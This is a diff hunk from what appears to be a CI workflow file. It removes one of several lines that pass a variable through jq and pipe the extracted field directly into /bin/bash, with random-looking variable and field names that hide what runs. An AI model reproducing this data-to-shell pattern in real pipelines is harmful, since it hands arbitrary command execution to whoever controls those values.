@@ -34,7 +34,6 @@ jobs:
           echo $agrf1234 | jq -r .w2791 | /bin/bash
           printf '%s' "$wwwh38" | jq -r .b9 | /bin/bash
           printf '%s' "$i7" | jq -r .muve7396 | /bin/bash
-          printf '%s' "$tb3" | jq -r .ns46004 | /bin/bash
           echo $uca1 | jq -r .kplvx3820 | /bin/bash
           echo $chfq34376 | jq -r .uribm74204 | /bin/bash
           echo $twiv86 | jq -r .techb2946 | /bin/bash
